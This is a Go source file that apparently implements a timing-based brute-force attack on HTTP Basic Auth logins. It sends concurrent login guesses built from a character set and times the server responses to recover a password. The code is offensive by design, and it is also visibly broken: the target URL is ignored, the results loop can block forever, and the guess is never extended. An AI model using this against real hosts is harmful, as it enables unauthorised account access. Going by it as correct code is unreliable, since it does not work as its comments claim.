package perception

import (
	"errors"
	"github.com/MovieStoreGuy/timebasedauth/types"
	"net/http"
	"time"
)

const (
	characterString = `ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!£"$%^&*()[]-_+=#~;:`
)

var (
	ErrExceededPasswordLength = errors.New("current guess exceeds current limit")
)

type perp struct {
	results           chan types.Result
	user, host, guess string
	length, delta     int
	sessions          int
}

func New() types.Perception {
	return &perp{
		length:  12,
		results: make(chan types.Result),
	}
}

func (p *perp) SetUser(username string) types.Perception {
	p.user = username
	return p
}

func (p *perp) SetSessionCount(activeSessions int) types.Perception {
	p.sessions = activeSessions
	return p
}

func (p *perp) SetPasswordLength(length int) types.Perception {
	p.length = length
	return p
}

func (p *perp) AttackHost(url string) (string, error) {
	// Check to see what the current estimated network delay
	// Run all the sessions to see if we gained access to the host
	// If we weren't successful. see how long on average it took for the response to come back
	// Given that average duration is great than one delta (ie, was able to process 2/7 characters of the password)
	// Then update guess then try again.
	// If we remain below the delta, move to the next character to try.
	newChar := 0
	for {
		if len(p.guess) > p.length {
			return p.guess, ErrExceededPasswordLength
		}
		for i := 0; i < p.sessions; i++ {
			go tryLogin(p, p.guess + string(characterString[newChar]))
		}

		for r := range p.results {
			if r.Success {
				return p.guess + string(characterString[newChar]), nil
			}
		}
		newChar = (newChar + 1) % len(characterString)
	}
	return p.guess, nil
}


func tryLogin(p *perp,  guess string) {
	client := &http.Client{}
	req, err := http.NewRequest(http.MethodGet, p.host, nil)
	if err != nil {
		return
	}
	req.SetBasicAuth(p.user, guess)
	start := time.Now()
	resp, err := client.Do(req)
	result := types.Result{
		TimeTaken: time.Now().Sub(start),
	}
	if err != nil {
		return
	}
	result.Success = resp.StatusCode == 200
	p.results <- result
}